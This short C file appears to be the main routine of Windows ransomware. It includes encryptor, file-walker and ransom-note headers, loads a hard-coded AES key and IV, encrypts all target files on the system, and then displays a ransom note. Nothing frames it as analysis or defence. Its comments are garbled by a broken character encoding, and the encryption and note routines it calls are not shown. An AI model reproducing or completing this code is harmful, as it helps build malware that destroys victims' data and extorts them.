#include <windows.h>
#include <stdio.h>
#include "encryptor.h"
#include "walker.h"
#include "ransomenote.h"

#define AES_KEY_SIZE 32
#define IV_SIZE 16
#define FILENAME_PADDING 512  // ��α��� ������ �� �ֵ��� Ȯ��

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    unsigned char aes_key[AES_KEY_SIZE];
    unsigned char iv[IV_SIZE];

    // 1. �ϵ��ڵ��� Ű/IV ����
    restore_key(aes_key);
    restore_iv(iv);

    // 2. ��ü �ý��� �������� ��ȣȭ ���� (��� ���� ���� ���)
    encrypt_all_targets(aes_key, iv);

    // 3. ������Ʈ ��üȭ�� ���â
    create_ransom_note();

    return 0;
}
